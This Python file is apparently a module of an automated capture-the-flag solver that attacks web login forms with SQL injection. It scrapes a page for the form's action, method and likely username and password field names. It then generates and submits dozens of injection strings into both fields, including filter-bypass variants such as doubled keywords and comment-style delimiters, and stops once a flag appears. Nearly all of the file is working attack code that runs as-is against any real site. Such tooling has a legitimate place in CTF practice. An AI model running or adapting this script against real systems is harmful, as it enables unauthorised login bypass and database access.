from unit import BaseUnit
from collections import Counter
import sys
from io import StringIO
import argparse
from pwn import *
import subprocess
import os
import units.raw
import re
import units.web
import requests
import magic

class Unit(units.web.WebUnit):

	def __init__(self, config):
		super(Unit, self).__init__(config)
	
	def check(self, target):
		return super(Unit, self).check(target[0])

	def get_cases(self, target):
		
		# This should "yield 'name', (params,to,pass,to,evaluate)"
		# evaluate will see this second argument as only one variable and you will need to parse them out
		
		if not self.config['flag_format']:
			log.warning('No flag format specified, basic_sqli will not be effective.')

		r = requests.get(target)

		action = re.findall(r"<\s*form.*action\s*=\s*('|\")(.+?)('|\")", r.text, flags=re.IGNORECASE)
		method = re.findall(r"<\s*form.*method\s*=\s*('|\")(.+?)('|\")", r.text, flags=re.IGNORECASE)

		potential_username_variables = [
			'username', 'user', 'uname', 'un', 'name', 'user1', 'input1', 'uw1', 'username1', 'uname1', 'tbUsername', 'usern', 'id'
		]
		potential_password_variables = [
			'password', 'pass', 'pword', 'pw', 'pass1', 'input2', 'password1', 'pw1', 'pword1', 'tbPassword'
		]

		user_regex = "<\s*input.*name\s*=\s*('|\")(%s)('|\")" % "|".join(potential_username_variables)
		pass_regex = "<\s*input.*name\s*=\s*('|\")(%s)('|\")" % "|".join(potential_password_variables)

		username = re.findall(user_regex, r.text, flags=re.IGNORECASE)
		password = re.findall(pass_regex, r.text, flags=re.IGNORECASE)

		if action and method and username and password:
			if action: action = action[0][1]
			if method: method = method[0][1]
			if username: username = username[0][1]
			if password: password = password[0][1]

			try:
				method = vars(requests)[method.lower()]
			except IndexError:
				log.warning("Could not find an appropriate HTTP method... defaulting to POST!")
				method = requests.post

			quotes_possibilities = [ "'", '"' ]
			comment_possibilities = [ "--", '#', '/*', '%00' ]
			delimeter_possibilities = [ ' ', '/**/' ]
			test_possibilities = [ 'OR', 'OORR', 'UNION SELECT', 'UNUNIONION SELSELECTECT' ]

			payloads = []
			count_attempt = 0
			for quote in quotes_possibilities:
				for comment in comment_possibilities:
					for delimeter in delimeter_possibilities:
						for test in test_possibilities:

							payload = quote + delimeter + test.replace(' ' ,delimeter) + delimeter + '1' + delimeter + comment
							count_attempt += 1
							yield 'basic_sqli%d' % count_attempt, (target, method, action, username, password, payload)

		else:
			log.failure("[web.basic_sqli] Could not find potential HTTP variables! Aborting!")
			return # This will tell THE WHOLE UNIT to stop... it will no longer generate cases.


	def evaluate(self, target):
		# Split up the target (see get_cases)
		target, method, action, username, password, payload = target

		r = method(target + action, { username: payload, password : payload })
		# Hunt for flags. If we found one, stop all other requests!
		hit = self.find_flags(r.text)

		if hit:
			self.completed = True

		# You should ONLY return what is "interesting" 
		# Since we cannot gauge the results of this payload versus the others,
		# we will only care if we found the flag.
		return None
